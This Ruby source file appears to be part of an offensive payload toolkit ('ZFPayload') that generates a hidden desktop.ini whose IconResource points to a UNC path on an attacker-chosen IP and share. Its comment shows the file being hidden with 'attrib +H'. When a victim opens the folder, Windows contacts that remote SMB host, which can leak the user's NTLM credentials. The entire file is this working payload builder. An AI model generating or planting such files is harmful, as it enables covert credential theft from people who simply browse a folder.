#!/usr/bin/env ruby
#encoding: ASCII-8BIT
=begin
 desktop.ini generation
 
[.ShellClassInfo]
IconResource=\\ipaddr\share\path
[ViewState]
FolderType=Generic

attrib +H desktop.ini
=end

module ZFPayload
  class Desktopini
    def self.build(ip,path,file,params=nil)
      payload = "[.ShellClassInfo]
IconResource=\\\\" + ip + "\\" + path + "\\" + file + "
[ViewState]
FolderType=Generic
"
      return payload
    end
  end
end